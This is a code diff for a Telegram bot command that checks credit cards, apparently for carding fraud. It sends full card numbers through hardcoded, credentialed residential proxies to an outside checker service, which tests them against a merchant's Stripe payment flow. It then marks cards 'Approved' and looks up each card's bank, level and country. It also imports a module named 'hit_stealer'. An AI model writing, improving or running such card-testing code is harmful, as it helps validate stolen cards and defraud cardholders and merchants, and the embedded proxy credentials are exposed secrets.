@@ -4,7 +4,6 @@ from pyrogram.enums import ChatType
 import re, time, requests, httpx, asyncio
 from plugins.func.users_sql import *
 from plugins.tools.hit_stealer import send_hit_if_approved
-from datetime import date
 
 session = requests.Session()
 
@@ -62,51 +61,53 @@ async def cmd_cc(Client, message):
 """)
 
         tic = time.perf_counter()
-        card_message = ""
-        for attempt in range(3):  # Retry 3 times
+        proxy_input = "proxy.proxiware.com:1337:user-default-network-res-country-us:OedbOv0g3JOQ"
+        site_input = "https://www.tekkabazzar.com"
+        kiltes_url = f"https://kiltes.lol/str/?proxy={proxy_input}&site={site_input}&cc={fullcc}"
+
+        async def stripe_check():
+            result = ""
+            for attempt in range(2):  # Retry max 2 times
+                try:
+                    async with httpx.AsyncClient(timeout=10) as client:
+                        res = await client.get(kiltes_url)
+                        if res.status_code == 200:
+                            try:
+                                data = res.json()
+                                result = data.get("result") or data.get("message") or data.get("error") or res.text
+                            except:
+                                result = res.text
+                            break
+                        else:
+                            result = f"❌ HTTP {res.status_code} — Retrying..."
+                except Exception as e:
+                    result = f"❌ Request failed: {e} — Retrying..."
+                await asyncio.sleep(1)
+            return result
+
+        async def bin_lookup():
             try:
-                proxy_input = "proxy.proxiware.com:1337:user-default-network-res-country-us:OedbOv0g3JOQ"
-                site_input = "https://www.tekkabazzar.com"
-                kiltes_url = f"https://kiltes.lol/str/?proxy={proxy_input}&site={site_input}&cc={fullcc}"
+                headers = {"User-Agent": "Mozilla/5.0"}
+                url = f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}"
+                try:
+                    binres = session.get(url, headers=headers, timeout=7).json()
+                except:
+                    proxy = "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000"
+                    binres = session.get(url, headers=headers, proxies={"http": proxy, "https": proxy}, timeout=10).json()
+                return {
+                    "brand": binres.get("brand", "N/A").upper(),
+                    "type": binres.get("type", "N/A").upper(),
+                    "level": binres.get("level", "N/A").upper(),
+                    "bank": binres.get("bank", "N/A").upper(),
+                    "country": binres.get("country_name", "N/A").upper(),
+                    "flag": binres.get("country_flag") or "🏳️"
+                }
+            except:
+                return {"brand": "N/A", "type": "N/A", "level": "N/A", "bank": "N/A", "country": "N/A", "flag": "🏳️"}
 
-                async with httpx.AsyncClient(timeout=25) as client:
-                    res = await client.get(kiltes_url)
-                    if res.status_code == 200:
-                        try:
-                            data = res.json()
-                            card_message = data.get("result") or data.get("message") or data.get("error") or res.text
-                        except:
-                            card_message = res.text
-                        break  # success, break retry loop
-                    else:
-                        card_message = f"❌ HTTP {res.status_code} — Retrying..."
-            except Exception as e:
-                card_message = f"❌ Request failed: {e} — Retrying..."
-
-            await asyncio.sleep(2)  # wait before retry
-
+        card_message, bin_data = await asyncio.gather(stripe_check(), bin_lookup())
         toc = time.perf_counter()
 
-        # BIN Lookup
-        try:
-            proxy = "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000"
-            headers = {"User-Agent": "Mozilla/5.0"}
-            proxies = {"http": proxy, "https": proxy}
-            try:
-                binres = session.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}", headers=headers, proxies=proxies, timeout=10).json()
-            except:
-                binres = session.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}", headers=headers, timeout=10).json()
-            brand = str(binres.get("brand") or binres.get("scheme") or "N/A").upper()
-            type_ = str(binres.get("type", "N/A")).upper()
-            level = str(binres.get("level", "N/A")).upper()
-            bank = str(binres.get("bank", "N/A")).upper()
-            country = str(binres.get("country_name", "N/A")).upper()
-            flag = binres.get("country_flag") or "🏳️"
-        except:
-            brand = type_ = level = bank = country = "N/A"
-            flag = "🏳️"
-
-        # Decision Logic
         msg_lower = card_message.lower()
         status = "Approved ✅" if "payment method added" in msg_lower else "Declined ❌"
 
@@ -117,9 +118,9 @@ async def cmd_cc(Client, message):
 <b>⊙ CC:</b> <code>{fullcc}</code>
 <b>⊙ Status:</b> {status}
 <b>⊙ Response:</b> {card_message}
-<b>⊙ Bank:</b> {bank}
-<b>⊚ Bin type:</b> {brand} - {type_} - {level}
-<b>⊙ Country:</b> {country} {flag}
+<b>⊙ Bank:</b> {bin_data['bank']}
+<b>⊚ Bin type:</b> {bin_data['brand']} - {bin_data['type']} - {bin_data['level']}
+<b>⊙ Country:</b> {bin_data['country']} {bin_data['flag']}
 <b>⊙ Time:</b> {toc - tic:.2f}s
 <b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
 """
